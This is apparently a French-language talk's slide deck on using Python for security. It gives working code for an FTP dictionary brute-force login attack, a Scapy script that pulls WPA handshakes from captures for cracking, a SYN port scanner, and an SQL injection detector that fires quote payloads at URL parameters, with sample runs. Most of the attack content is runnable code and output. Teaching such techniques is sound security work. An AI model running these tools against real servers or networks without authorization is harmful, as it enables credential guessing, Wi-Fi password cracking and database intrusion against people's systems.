# ~ Python appliqué à la sécurité ~

---

## L'attaque des 80's

- Bruteforce de serveur FTP
- Utilisation d'un "dictionnaire" d'utilisateurs et mots de passe
- Total: ~50 lignes de code
- Améliorations possibles:
    - Support des connexions SSL
    - Attaque de plusieurs serveurs simultanément
    - Extraction automatique des fichiers

---

## L'attaque des 80's - Lecture de la wordlist

    !python
    def read_list(filepath):
        data = []
        with open(filepath) as ifile:
            for line in ifile:
                # suppression des caractères de fin de ligne
                line = line.strip('\r\n')
                if line: # une chaîne vide évalue à "False"
                    data.append(line)
        return data

---

## L'attaque des 80's - Connexion

    !python
    def try_login(server, port, username, password):
        ftp = ftplib.FTP()
        ftp.connect(server, port)
        try:
            ftp.login(username, password)
            result = True
        except ftplib.error_reply:
            result = False
        finally:
            # quoi qu'il arrive, refermer la connexion
            ftp.quit()
        return result

---

## L'attaque des 80's - Code principal

    !python
    # lecture des noms d'utilisateurs et mots de passe
    usernames = read_list(userfile)
    passwords = read_list(passwdfile)

    # essai de chaque couple utilisateur/password
    for username in usernames:
        for password in passwords:
            print "Trying '%s':'%s'..." % (username, password),
            if try_login(server, port, username, password):
                print "OK"
                sys.exit(0)
            print "FAILED"

---

## Scapy

- Boite à outils de manipulation de paquets
    - Sniffing
    - Envoi/réception
    - Modification à la volée
    - Fuzzing
- Prototypage rapide de nouveaux protocoles
- Et en plus, c'est facile!

---

## Scapy - Disney World

    !python
    class Disney(Packet):
        name = "Walt Disney Protocol"
        fields_desc = [
            ShortField("mickey", 5),
            XByteField("minnie", 3),
            IntEnumField("donald", 1, {
                1: "happy",
                2: "cool",
                3: "angry"
            })
        ]

    >>> disney_pkt = Disney(mickey=1, minnie=2, donald=3)
    >>> print disney_pkt.sprintf("Donald is %Disney.donald%")

        Donald is angry

---

## Scapy - Foursome

- Extraction du 4-way handshake WPA d'une capture
- Réduction de la taille de la capture au strict minimum
- Total: ~20 lignes de code
- Améliorations possibles:
    - Filtrage par BSSID

---

## Scapy - Foursome - Code

    !python
    print "Reading input file: %s" % in_pcap
    packets = rdpcap(in_pcap)
    handshake_packets = []
    for packet in packets:
        if EAPOL in packet:
            print packet.sprintf(
                " - Found packet from %Dot11.addr2% to %Dot11.addr1%"
            )
            handshake_packets.append(packet)
    print "Writing to output file: %s" % out_pcap
    wrpcap(out_pcap, handshake_packets)
    print "Done"

---

## Scapy - Foursome - Exemple

    $ python foursome.py wpa.full.cap wpa_hs.cap
    Reading input file: wpa.full.cap
     - Found packet from 00:14:6c:7e:40:80 to 00:0f:b5:88:ac:82
     - Found packet from 00:0f:b5:88:ac:82 to 00:14:6c:7e:40:80
     - Found packet from 00:14:6c:7e:40:80 to 00:0f:b5:88:ac:82
     - Found packet from 00:0f:b5:88:ac:82 to 00:14:6c:7e:40:80
    Writing to output file: wpa_hs.cap
    Done

---

## Scapy - Toc toc

- Scanner de ports (SYN scan)
- Distinction entre ouvert et "ouvert|filtré"
- Total: ~35 lignes de code
- Améliorations possibles:
    - Support d'autres types de scans (NULL, FIN, Xmas)
    - Scan UDP
    - Récupération des bannières

---

## Scapy - Toc toc - Création des paquets

    !python
    ip_layer = IP(dst="192.168.31.131")
    tcp_layer = TCP(dport=[80, 443], flags='S')
    packet = ip_layer/tcp_layer
    ans, unans = sr(packet, retry=3, timeout=30)

Ou:

    !python
    packet = IP(dst="192.168.31.131")/TCP(dport=[80, 443], flags='S')
    answered, unanswered = sr(packet, retry=3, timeout=30)

---

## Scapy - Toc toc - Résultats

- Extraction des valeurs de champs grâce au format "%Layer.field%"

        !python
        for sent, received in answered:
            if received.sprintf('%TCP.flags%') == 'SA':
                print "%d (%s): open" % (
                    sent.dport, sent.sprintf('%TCP.dport%')
                )
        for sent in unanswered:
            print "%d (%s): open|filtered" % (
                sent.dport, sent.sprintf('%TCP.dport%')
            )

---

## Scapy - Toc toc - Exemple

    $ python portscan.py 192.168.31.131 80,443,9000-9500,31337
    Starting scan on 504 ports
    80 (www) is open
    9391 (9391) is open
    31337 (31337) is open|filtered
    Finished scanning

---

## Et paf la BDD!

- Détection de potentielles injections SQL
- Methode GET uniquement
- Support de MySQL/Oracle/MSSQL/MS-Access
- Total: ~50 lignes de code
- Améliorations possibles:
    - Injection dans plusieurs champs simultanés
    - Validation de la détection
    - Autres points d'entrée (POST, Cookie, etc...)
    - Exploitation de la vulnérabilité

---

## Et paf la BDD! - Erreurs SQL

    !python
    sql_errors = {
        'MySQL': 'error in your SQL syntax',
        'Oracle': 'ORA-01756',
        'MSSQL_OLEdb': 'Microsoft OLE DB Provider for SQL Server',
        'MSSQL_Uqm': 'Unclosed quotation mark',
        'MS-Access_ODBC': 'ODBC Microsoft Access Driver'
    }

---

## Et paf la BDD! - Découpage de l'URL

    !python
    def parse_url(url):
        parsed_url = urlparse(url)  # http://url.com/page.php?id=1&foo=bar
        base_url = urljoin(
            '%s://%s' % (parsed_url.scheme, parsed_url.netloc), parsed_url.path
        )  # http://url.com/page.php
        url_params = parse_qsl(parsed_url.query)  # [('id', '1'), ('foo', 'bar')]
        return base_url, url_params

---

## Et paf la BDD! - Ré-encodage de l'URL

    !python
    def encode_url(base_url, params, target_param, injection):
        req_params = []
        for param, value in params:
            if param == target_param:
                payload = value + injection  # 1'
                new_param = (param, payload)  # ('id', "1'")
                req_params.append(new_param)
            else:  # parametre non testé, ajout tel quel
                new_param = (param, value)  # ('id', '1')
                req_params.append(new_param)
        encoded_params = urlencode(req_params)  # id=1%27&foo=bar
        test_url = base_url + '?' + encoded_params
        # test_url: http://url.com/page.php?id=1%27&foo=bar
        return test_url, payload

---

## Et paf la BDD! - Test d'injection

    !python
    base_url, url_params = parse_url(url)
    print "Testing %s (tested param: %s)" % (url, target_param)
    for injection in ["'", '"', "')", '")']:
        test_url, payload = encode_url(
            base_url, url_params, target_param, injection
        )
        html = urlopen(test_url).read()
        for dbms in sql_errors:
            if sql_errors[dbms] in html:
                print "Potential %s SQL injection detected!" % dbms
                print " - Payload: %s" % payload

---

## Et paf la BDD! - Exemple

    $ python sqlidetect.py "http://test.vulnweb.com/listproducts?cat=1" cat
    Testing http://testphp.vulnweb.com/listproducts (tested param: cat)...
    Potential MySQL SQL injection detected!
     - Payload: 1'
    Potential MySQL SQL injection detected!
     - Payload: 1"
    Potential MySQL SQL injection detected!
     - Payload: 1')
    Potential MySQL SQL injection detected!
     - Payload: 1")
